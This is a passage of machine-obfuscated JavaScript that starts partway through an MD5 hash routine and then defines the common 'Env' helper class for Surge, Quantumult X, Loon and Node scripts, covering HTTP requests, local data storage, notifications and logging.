    _0x19da68 = _0x49d661(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 14], _0x90fce4, 2878612391);
    _0x453221 = _0x49d661(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 5], _0x134f5f, 4237533241);
    _0x2885e3 = _0x49d661(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 12], _0x2993f4, 1700485571);
    _0x333c5f = _0x49d661(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 3], _0x1cff8a, 2399980690);
    _0x19da68 = _0x49d661(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 10], _0x90fce4, 4293915773);
    _0x453221 = _0x49d661(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 1], _0x134f5f, 2240044497);
    _0x2885e3 = _0x49d661(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 8], _0x2993f4, 1873313359);
    _0x333c5f = _0x49d661(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 15], _0x1cff8a, 4264355552);
    _0x19da68 = _0x49d661(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 6], _0x90fce4, 2734768916);
    _0x453221 = _0x49d661(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 13], _0x134f5f, 1309151649);
    _0x2885e3 = _0x49d661(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 4], _0x2993f4, 4149444226);
    _0x333c5f = _0x49d661(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 11], _0x1cff8a, 3174756917);
    _0x19da68 = _0x49d661(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 2], _0x90fce4, 718787259);
    _0x453221 = _0x49d661(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 9], _0x134f5f, 3951481745);
    _0x2885e3 = _0x2726c4(_0x2885e3, _0x28326d);
    _0x453221 = _0x2726c4(_0x453221, _0xf1cfd5);
    _0x19da68 = _0x2726c4(_0x19da68, _0x4053d4);
    _0x333c5f = _0x2726c4(_0x333c5f, _0x25fa74);
  }
  var _0x3c8325 = _0x18cbe2(_0x2885e3) + _0x18cbe2(_0x453221) + _0x18cbe2(_0x19da68) + _0x18cbe2(_0x333c5f);
  return _0x3c8325.toLowerCase();
}
function Env(_0x8b9c, _0x3202fb) {
  class _0x3d3344 {
    constructor(_0x3e2ec1) {
      this.env = _0x3e2ec1;
    }
    send(_0x13b9ee, _0x49e321 = "GET") {
      _0x13b9ee = "string" == typeof _0x13b9ee ? {
        url: _0x13b9ee
      } : _0x13b9ee;
      let _0x312aa9 = this.get;
      "POST" === _0x49e321 && (_0x312aa9 = this.post);
      return new Promise((_0x96a1fc, _0x591aeb) => {
        _0x312aa9.call(this, _0x13b9ee, (_0x4794d1, _0x4bb2c4, _0x58c111) => {
          _0x4794d1 ? _0x591aeb(_0x4794d1) : _0x96a1fc(_0x4bb2c4);
        });
      });
    }
    get(_0x472d19) {
      return this.send.call(this.env, _0x472d19);
    }
    post(_0x5e087a) {
      return this.send.call(this.env, _0x5e087a, "POST");
    }
  }
  return new class {
    constructor(_0x15d9d4, _0x12fcef) {
      this.name = _0x15d9d4;
      this.http = new _0x3d3344(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.startTime = new Date().getTime();
      Object.assign(this, _0x12fcef);
      this.log("", "🔔" + this.name + ", 开始!");
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    toObj(_0x45ceb6, _0xc03c95 = null) {
      try {
        return JSON.parse(_0x45ceb6);
      } catch {
        return _0xc03c95;
      }
    }
    toStr(_0x2fe8d0, _0x3c405f = null) {
      try {
        return JSON.stringify(_0x2fe8d0);
      } catch {
        return _0x3c405f;
      }
    }
    getjson(_0x1311d6, _0x552225) {
      let _0x31f391 = _0x552225;
      const _0x1f98dd = this.getdata(_0x1311d6);
      if (_0x1f98dd) {
        try {
          _0x31f391 = JSON.parse(this.getdata(_0x1311d6));
        } catch {}
      }
      return _0x31f391;
    }
    setjson(_0x1be56f, _0x4da032) {
      try {
        return this.setdata(JSON.stringify(_0x1be56f), _0x4da032);
      } catch {
        return !1;
      }
    }
    getScript(_0x336d97) {
      return new Promise(_0x3c29c2 => {
        this.get({
          url: _0x336d97
        }, (_0x42ffdd, _0x378587, _0x45bcc9) => _0x3c29c2(_0x45bcc9));
      });
    }
    runScript(_0x3b7237, _0x7ec9da) {
      return new Promise(_0x2fcd3b => {
        let _0x3e6e63 = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        _0x3e6e63 = _0x3e6e63 ? _0x3e6e63.replace(/\n/g, "").trim() : _0x3e6e63;
        let _0x374f4a = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        _0x374f4a = _0x374f4a ? 1 * _0x374f4a : 20;
        _0x374f4a = _0x7ec9da && _0x7ec9da.timeout ? _0x7ec9da.timeout : _0x374f4a;
        const [_0x367861, _0x2f1787] = _0x3e6e63.split("@"),
          _0x2ab841 = {
            url: "http://" + _0x2f1787 + "/v1/scripting/evaluate",
            body: {
              script_text: _0x3b7237,
              mock_type: "cron",
              timeout: _0x374f4a
            },
            headers: {
              "X-Key": _0x367861,
              Accept: "*/*"
            }
          };
        this.post(_0x2ab841, (_0x5f0f5f, _0x44fc92, _0x5cb67c) => _0x2fcd3b(_0x5cb67c));
      }).catch(_0x117b91 => this.logErr(_0x117b91));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x267caa = this.path.resolve(this.dataFile),
          _0x5e3222 = this.path.resolve(process.cwd(), this.dataFile),
          _0x447958 = this.fs.existsSync(_0x267caa),
          _0x59595f = !_0x447958 && this.fs.existsSync(_0x5e3222);
        if (!_0x447958 && !_0x59595f) {
          return {};
        }
        {
          const _0x1c17d7 = _0x447958 ? _0x267caa : _0x5e3222;
          try {
            return JSON.parse(this.fs.readFileSync(_0x1c17d7));
          } catch (_0x5dd579) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x5014f8 = this.path.resolve(this.dataFile),
          _0x3b4a77 = this.path.resolve(process.cwd(), this.dataFile),
          _0x460e9c = this.fs.existsSync(_0x5014f8),
          _0x307472 = !_0x460e9c && this.fs.existsSync(_0x3b4a77),
          _0x2cb3d3 = JSON.stringify(this.data);
        _0x460e9c ? this.fs.writeFileSync(_0x5014f8, _0x2cb3d3) : _0x307472 ? this.fs.writeFileSync(_0x3b4a77, _0x2cb3d3) : this.fs.writeFileSync(_0x5014f8, _0x2cb3d3);
      }
    }
    lodash_get(_0xb7693, _0x29b8e1, _0x1abcb2) {
      const _0x3c08b0 = _0x29b8e1.replace(/\[(\d+)\]/g, ".$1").split(".");
      let _0x5bd0ac = _0xb7693;
      for (const _0xb00aa0 of _0x3c08b0) if (_0x5bd0ac = Object(_0x5bd0ac)[_0xb00aa0], void 0 === _0x5bd0ac) {
        return _0x1abcb2;
      }
      return _0x5bd0ac;
    }
    lodash_set(_0x2de440, _0x53f7cf, _0x8f8bc1) {
      return Object(_0x2de440) !== _0x2de440 ? _0x2de440 : (Array.isArray(_0x53f7cf) || (_0x53f7cf = _0x53f7cf.toString().match(/[^.[\]]+/g) || []), _0x53f7cf.slice(0, -1).reduce((_0x340db2, _0x4446ec, _0x1e0bc0) => Object(_0x340db2[_0x4446ec]) === _0x340db2[_0x4446ec] ? _0x340db2[_0x4446ec] : _0x340db2[_0x4446ec] = Math.abs(_0x53f7cf[_0x1e0bc0 + 1]) >> 0 == +_0x53f7cf[_0x1e0bc0 + 1] ? [] : {}, _0x2de440)[_0x53f7cf[_0x53f7cf.length - 1]] = _0x8f8bc1, _0x2de440);
    }
    getdata(_0x418ef6) {
      let _0x477623 = this.getval(_0x418ef6);
      if (/^@/.test(_0x418ef6)) {
        const [, _0x376fd8, _0x11f65b] = /^@(.*?)\.(.*?)$/.exec(_0x418ef6),
          _0x236b61 = _0x376fd8 ? this.getval(_0x376fd8) : "";
        if (_0x236b61) {
          try {
            const _0x526cd0 = JSON.parse(_0x236b61);
            _0x477623 = _0x526cd0 ? this.lodash_get(_0x526cd0, _0x11f65b, "") : _0x477623;
          } catch (_0x534bd0) {
            _0x477623 = "";
          }
        }
      }
      return _0x477623;
    }
    setdata(_0x4c4132, _0x2704ab) {
      let _0x3b3ba0 = !1;
      if (/^@/.test(_0x2704ab)) {
        const [, _0x50251d, _0x1a98d8] = /^@(.*?)\.(.*?)$/.exec(_0x2704ab),
          _0x8af8f7 = this.getval(_0x50251d),
          _0x468d6d = _0x50251d ? "null" === _0x8af8f7 ? null : _0x8af8f7 || "{}" : "{}";
        try {
          const _0x5ce69b = JSON.parse(_0x468d6d);
          this.lodash_set(_0x5ce69b, _0x1a98d8, _0x4c4132);
          _0x3b3ba0 = this.setval(JSON.stringify(_0x5ce69b), _0x50251d);
        } catch (_0x30c03c) {
          const _0x20d1e4 = {};
          this.lodash_set(_0x20d1e4, _0x1a98d8, _0x4c4132);
          _0x3b3ba0 = this.setval(JSON.stringify(_0x20d1e4), _0x50251d);
        }
      } else {
        _0x3b3ba0 = this.setval(_0x4c4132, _0x2704ab);
      }
      return _0x3b3ba0;
    }
    getval(_0x5d4952) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(_0x5d4952) : this.isQuanX() ? $prefs.valueForKey(_0x5d4952) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x5d4952]) : this.data && this.data[_0x5d4952] || null;
    }
    setval(_0x16ecbf, _0x57cfaf) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(_0x16ecbf, _0x57cfaf) : this.isQuanX() ? $prefs.setValueForKey(_0x16ecbf, _0x57cfaf) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x57cfaf] = _0x16ecbf, this.writedata(), !0) : this.data && this.data[_0x57cfaf] || null;
    }
    initGotEnv(_0x69ac01) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      _0x69ac01 && (_0x69ac01.headers = _0x69ac01.headers ? _0x69ac01.headers : {}, void 0 === _0x69ac01.headers.Cookie && void 0 === _0x69ac01.cookieJar && (_0x69ac01.cookieJar = this.ckjar));
    }
    get(_0x1f29f4, _0x54b78e = () => {}) {
      _0x1f29f4.headers && (delete _0x1f29f4.headers["Content-Type"], delete _0x1f29f4.headers["Content-Length"]);
      this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (_0x1f29f4.headers = _0x1f29f4.headers || {}, Object.assign(_0x1f29f4.headers, {
        "X-Surge-Skip-Scripting": !1
      })), $httpClient.get(_0x1f29f4, (_0x69030d, _0x4522c7, _0x3142a8) => {
        !_0x69030d && _0x4522c7 && (_0x4522c7.body = _0x3142a8, _0x4522c7.statusCode = _0x4522c7.status);
        _0x54b78e(_0x69030d, _0x4522c7, _0x3142a8);
      })) : this.isQuanX() ? (this.isNeedRewrite && (_0x1f29f4.opts = _0x1f29f4.opts || {}, Object.assign(_0x1f29f4.opts, {
        hints: !1
      })), $task.fetch(_0x1f29f4).then(_0x1f5166 => {
        const {
          statusCode: _0x51ecf4,
          statusCode: _0x2723a2,
          headers: _0x2c339f,
          body: _0x2adca0
        } = _0x1f5166;
        _0x54b78e(null, {
          status: _0x51ecf4,
          statusCode: _0x2723a2,
          headers: _0x2c339f,
          body: _0x2adca0
        }, _0x2adca0);
      }, _0x2e7906 => _0x54b78e(_0x2e7906))) : this.isNode() && (this.initGotEnv(_0x1f29f4), this.got(_0x1f29f4).on("redirect", (_0x323fac, _0x13a079) => {
        try {
          if (_0x323fac.headers["set-cookie"]) {
            const _0x37f3fa = _0x323fac.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
            _0x37f3fa && this.ckjar.setCookieSync(_0x37f3fa, null);
            _0x13a079.cookieJar = this.ckjar;
          }
        } catch (_0x6e1795) {
          this.logErr(_0x6e1795);
        }
      }).then(_0xc52278 => {
        const {
          statusCode: _0x103938,
          statusCode: _0x5bcb26,
          headers: _0x5de0ea,
          body: _0x31bfaa
        } = _0xc52278;
        _0x54b78e(null, {
          status: _0x103938,
          statusCode: _0x5bcb26,
          headers: _0x5de0ea,
          body: _0x31bfaa
        }, _0x31bfaa);
      }, _0x1bbd6e => {
        const {
          message: _0x4d4044,
          response: _0x284351
        } = _0x1bbd6e;
        _0x54b78e(_0x4d4044, _0x284351, _0x284351 && _0x284351.body);
      }));
    }
    post(_0x1c8d00, _0x5f5156 = () => {}) {
      if (_0x1c8d00.body && _0x1c8d00.headers && !_0x1c8d00.headers["Content-Type"] && (_0x1c8d00.headers["Content-Type"] = "application/x-www-form-urlencoded"), _0x1c8d00.headers && delete _0x1c8d00.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (_0x1c8d00.headers = _0x1c8d00.headers || {}, Object.assign(_0x1c8d00.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.post(_0x1c8d00, (_0x6fa4ab, _0x11f8de, _0x57ab08) => {
          !_0x6fa4ab && _0x11f8de && (_0x11f8de.body = _0x57ab08, _0x11f8de.statusCode = _0x11f8de.status);
          _0x5f5156(_0x6fa4ab, _0x11f8de, _0x57ab08);
        });
      } else {
        if (this.isQuanX()) {
          _0x1c8d00.method = "POST";
          this.isNeedRewrite && (_0x1c8d00.opts = _0x1c8d00.opts || {}, Object.assign(_0x1c8d00.opts, {
            hints: !1
          }));
          $task.fetch(_0x1c8d00).then(_0x535a5d => {
            const {
              statusCode: _0x2f628b,
              statusCode: _0x3475d8,
              headers: _0x47a60c,
              body: _0x26ed5a
            } = _0x535a5d;
            _0x5f5156(null, {
              status: _0x2f628b,
              statusCode: _0x3475d8,
              headers: _0x47a60c,
              body: _0x26ed5a
            }, _0x26ed5a);
          }, _0x447afb => _0x5f5156(_0x447afb));
        } else {
          if (this.isNode()) {
            this.initGotEnv(_0x1c8d00);
            const {
              url: _0x1c2b51,
              ..._0x21f71f
            } = _0x1c8d00;
            this.got.post(_0x1c2b51, _0x21f71f).then(_0x158777 => {
              const {
                statusCode: _0x5a6dce,
                statusCode: _0x13fd78,
                headers: _0x525255,
                body: _0x165443
              } = _0x158777;
              _0x5f5156(null, {
                status: _0x5a6dce,
                statusCode: _0x13fd78,
                headers: _0x525255,
                body: _0x165443
              }, _0x165443);
            }, _0x37ab39 => {
              const {
                message: _0xfa14a8,
                response: _0xa82e85
              } = _0x37ab39;
              _0x5f5156(_0xfa14a8, _0xa82e85, _0xa82e85 && _0xa82e85.body);
            });
          }
        }
      }
    }
    time(_0x24c7c9) {
      let _0x1cc0a4 = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "H+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      /(y+)/.test(_0x24c7c9) && (_0x24c7c9 = _0x24c7c9.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let _0x1bf290 in _0x1cc0a4) new RegExp("(" + _0x1bf290 + ")").test(_0x24c7c9) && (_0x24c7c9 = _0x24c7c9.replace(RegExp.$1, 1 == RegExp.$1.length ? _0x1cc0a4[_0x1bf290] : ("00" + _0x1cc0a4[_0x1bf290]).substr(("" + _0x1cc0a4[_0x1bf290]).length)));
      return _0x24c7c9;
    }
    msg(_0x1102cb = _0x8b9c, _0x10f937 = "", _0x43bc7c = "", _0x571f3b) {
      const _0x2a3482 = _0x1b1b90 => {
        if (!_0x1b1b90) {
          return _0x1b1b90;
        }
        if ("string" == typeof _0x1b1b90) {
          return this.isLoon() ? _0x1b1b90 : this.isQuanX() ? {
            "open-url": _0x1b1b90
          } : this.isSurge() ? {
            url: _0x1b1b90
          } : void 0;
        }
        if ("object" == typeof _0x1b1b90) {
          if (this.isLoon()) {
            let _0x96371b = _0x1b1b90.openUrl || _0x1b1b90.url || _0x1b1b90["open-url"],
              _0x26953f = _0x1b1b90.mediaUrl || _0x1b1b90["media-url"];
            return {
              openUrl: _0x96371b,
              mediaUrl: _0x26953f
            };
          }
          if (this.isQuanX()) {
            let _0x1b0684 = _0x1b1b90["open-url"] || _0x1b1b90.url || _0x1b1b90.openUrl,
              _0x57e048 = _0x1b1b90["media-url"] || _0x1b1b90.mediaUrl;
            return {
              "open-url": _0x1b0684,
              "media-url": _0x57e048
            };
          }
          if (this.isSurge()) {
            let _0x22e0f7 = _0x1b1b90.url || _0x1b1b90.openUrl || _0x1b1b90["open-url"];
            return {
              url: _0x22e0f7
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(_0x1102cb, _0x10f937, _0x43bc7c, _0x2a3482(_0x571f3b)) : this.isQuanX() && $notify(_0x1102cb, _0x10f937, _0x43bc7c, _0x2a3482(_0x571f3b))), !this.isMuteLog) {
        let _0x20225a = ["", "==============📣系统通知📣=============="];
        _0x20225a.push(_0x1102cb);
        _0x10f937 && _0x20225a.push(_0x10f937);
        _0x43bc7c && _0x20225a.push(_0x43bc7c);
        console.log(_0x20225a.join("\n"));
        this.logs = this.logs.concat(_0x20225a);
      }
    }
    log(..._0x20c7ef) {
      _0x20c7ef.length > 0 && (this.logs = [...this.logs, ..._0x20c7ef]);
      console.log(_0x20c7ef.join(this.logSeparator));
    }
    logErr(_0x1ddd7d, _0x3ed2d2) {
      const _0x44d313 = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      _0x44d313 ? this.log("", "❗️" + this.name + ", 错误!", _0x1ddd7d.stack) : this.log("", "❗️" + this.name + ", 错误!", _0x1ddd7d);
    }
    wait(_0x2c6afa) {
      return new Promise(_0xbbe788 => setTimeout(_0xbbe788, _0x2c6afa));
    }
    done(_0x42e64a = {}) {
      const _0x48d356 = new Date().getTime(),
        _0x1b1c19 = (_0x48d356 - this.startTime) / 1000;
      this.log("", "🔔" + this.name + ", 结束! 🕛 " + _0x1b1c19 + " 秒");
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(_0x42e64a);
    }
  }(_0x8b9c, _0x3202fb);
}